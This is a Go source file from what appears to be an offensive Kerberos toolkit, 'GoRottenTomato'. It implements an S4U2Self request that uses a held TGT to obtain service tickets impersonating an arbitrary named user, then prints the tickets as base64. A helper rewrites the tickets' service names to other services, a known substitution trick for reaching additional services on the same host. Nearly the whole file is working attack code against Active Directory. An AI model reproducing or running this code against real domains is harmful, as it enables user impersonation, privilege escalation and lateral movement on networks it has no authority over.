package S4U2

import (
	"GoRottenTomato/krb5/AskTGS"
	"GoRottenTomato/krb5/crypto"
	"GoRottenTomato/krb5/flags"
	"GoRottenTomato/krb5/procedure"
	"GoRottenTomato/krb5/types"
	"encoding/base64"
	"fmt"
	"time"
)

func S4U2Self(dcIP, impersonate string, altservice []string, tgt procedure.KRB_CRED) ([]procedure.KRB_CRED, error) {
	fmt.Printf("[*]Starting S4U2Self\n")
	var creds []procedure.KRB_CRED
	kflags := types.GetKerberosFlags(flags.Renewable, flags.Renewable_OK, flags.Forwardable, flags.Enc_TKT_In_Skey)
	till := time.Now().UTC().Add(time.Minute * 15)

	fmt.Printf("[*]Building TGS-REQ for %s/%s\n", tgt.DecEncPart.Ticket_Info[0].PName.Name_String[0], tgt.DecEncPart.Ticket_Info[0].PRealm)
	tgs := procedure.NewTGSREQ(kflags, tgt.Tickets[0].Realm, tgt.DecEncPart.Ticket_Info[0].PName, tgt.DecEncPart.Ticket_Info[0].PName, till)
	err := tgs.SetPAData(tgt.Tickets[0], tgt.DecEncPart.Ticket_Info[0].Key)
	if err != nil {
		return creds, err
	}

	fmt.Printf("[*]Building PA-FOR-USER for %s\n", impersonate)
	pauser := types.PrincipalName{
		Name_Type: flags.KRB5_NT_ENTERPRISE_PRINCIPAL,
		Name_String: []string{impersonate},
	}
	paforuser := types.NewPAFORUSER(pauser, tgt.Tickets[0].Realm)
	S4UByteArray := paforuser.GetS4UByteArray()
	eType := crypto.GetEType(tgt.DecEncPart.Ticket_Info[0].Key.KeyType)
	check, err := eType.GetChecksumHash(tgt.DecEncPart.Ticket_Info[0].Key.KeyValue, S4UByteArray, 17)
	if err != nil {
		return creds, err
	}
	paforuser.Cksum = types.Checksum{
		CksumType: flags.KERB_CHECKSUM_HMAC_MD5,
		Checksum:  check,
	}
	mpaforuser, err := paforuser.Marshal()
	if err != nil {
		return creds, err
	}

	padata := types.PA_DATA{
		Padata_Type:  flags.PA_FOR_USER,
		Padata_Value: mpaforuser,
	}
	tgs.Padata = append(tgs.Padata, padata)

	fmt.Printf("[*]Starting request S4U2Self\n")
	tgsrep, err := AskTGS.AskTGS(*tgs, dcIP, tgt.DecEncPart.Ticket_Info[0].Key)
	if err != nil {
		return creds, err
	}

	if !tgsrep.Check(flags.TGSREP) {
		return creds, fmt.Errorf("asn tag check failed")
	}
	fmt.Printf("[+]S4u2Self Sucessful!\n")

	cred := *tgsrep.GetCRED()
	if altservice != nil {
		elder := getspn(cred.Tickets[0].SName.Name_String[0], cred.Tickets[0].Realm)
		return getCreds(cred, altservice, elder), nil
	}

	blob, err := cred.Marshal()
	if err != nil {
		return creds, err
	}
	fmt.Printf("[+]Got a TGS for %s@%s to %s@%s\n", cred.DecEncPart.Ticket_Info[0].PName.Name_String[0], cred.DecEncPart.Ticket_Info[0].PRealm, cred.Tickets[0].SName.Name_String[0], cred.Tickets[0].Realm)
	fmt.Printf("[+]Base64 S4U2Self TGS \n\n%s\n\n", base64.StdEncoding.EncodeToString(blob))
	creds = append(creds, cred)
	return creds, nil
}

func getCreds(cred procedure.KRB_CRED, altservice []string, elder string) (creds []procedure.KRB_CRED) {
	for _, service := range altservice{
		cred.Tickets[0].SName.Name_String = []string{service, elder}
		cred.DecEncPart.Ticket_Info[0].SName.Name_String = []string{service, elder}

		blob, err := cred.Marshal()
		if err != nil {
			fmt.Printf("[-]Alter %s to %s Failed!\n", elder, service)
			continue
		}
		creds = append(creds, cred)
		fmt.Printf("[+]Alter %s to %s/%s Sucessful!\n", cred.DecEncPart.Ticket_Info[0].PName.Name_String[0], cred.Tickets[0].SName.Name_String[0], cred.Tickets[0].SName.Name_String[1])
		fmt.Printf("[+]Got a TGS for %s@%s to %s@%s\n", cred.DecEncPart.Ticket_Info[0].PName.Name_String[0], cred.DecEncPart.Ticket_Info[0].PRealm, cred.Tickets[0].SName.Name_String[1], cred.Tickets[0].Realm)
		fmt.Printf("[+]Base64 S4U2Self TGS \n\n%s\n\n", base64.StdEncoding.EncodeToString(blob))
	}
	return creds
}

func getspn(mname, dname string) string {
	if mname[len(mname)-1:] == "$" {
		return fmt.Sprintf("%s.%s", mname[:len(mname)-1], dname)
	}
	return fmt.Sprintf("%s.%s", mname, dname)
}